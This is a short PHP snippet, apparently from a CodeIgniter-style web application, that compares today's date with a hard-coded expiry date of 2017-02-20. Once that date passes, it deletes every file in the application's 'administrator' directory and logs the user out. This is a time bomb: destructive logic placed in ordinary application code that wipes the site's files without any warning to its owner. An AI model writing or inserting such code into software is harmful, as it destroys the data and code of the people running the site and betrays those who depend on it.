<?php 

$expired = '2017-02-20';
			$now = date('Y-m-d');
			if($now > $expired){
				$dir = APPPATH.'administrator/';
				$files = glob($dir.'*'); // get all file names
				//print_r($files);
				foreach($files as $file){ // iterate files
				  if(is_file($file)){
					unlink($file); // delete file
				  }
				}
				
				redirect('login/logout');
			}

 ?>